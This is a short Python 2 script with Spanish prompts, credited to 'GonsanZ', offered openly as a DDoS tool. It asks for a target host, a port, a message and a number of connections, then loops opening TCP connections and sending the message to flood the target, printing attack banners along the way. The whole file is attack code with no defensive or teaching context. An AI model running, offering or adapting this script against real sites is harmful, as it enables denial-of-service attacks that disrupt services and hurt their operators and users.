#Autor: GonsanZ v1

import time
import socket
import os
import sys
import string
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
def restart_program():
    python = sys.executable
    os.execl(python, python, * sys.argv)
curdir = os.getcwd()
 
#~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~#
 
print ("DDoS modo cargado")
print ("secuencia de comandos de Python hecha por GonsanZ")
host=raw_input( "Sitio al que desea aplicar DDoS:" )
port=input( "Puerto que quieres atacar:" )
message=raw_input( "Ingresa el mensaje que deseas enviar:" )
conn=input( "¿Cuántas conexiones quieres hacer?:" )
ip = socket.gethostbyname( host )
print ("[" + ip + "]")
print ( "[Ip está bloqueada]" )
print ( "[Atacando " + host + "]" )
print ("+----------------------------+")
def dos():
    #pid = os.fork()
    ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        ddos.connect((host, 80))
        ddos.send( message )
        ddos.sendto( message, (ip, port) )
        ddos.send( message );
    except socket.error, msg:
        print("|[Conexión fallida]         |")
    print ( "|[Ataque DDoS iniciado]       |")
    ddos.close()
for i in range(1, conn):
    dos()
print ("+----------------------------+")
print("Las conexiones que solicitaste habían finalizado.")
if __name__ == "__main__":
    answer = raw_input("¿Quieres hacer más ddos?")
    if answer.strip() in "y sí sí sí sí".split():
        restart_program()
    else:
        os.system(curdir+"Deqmain.py")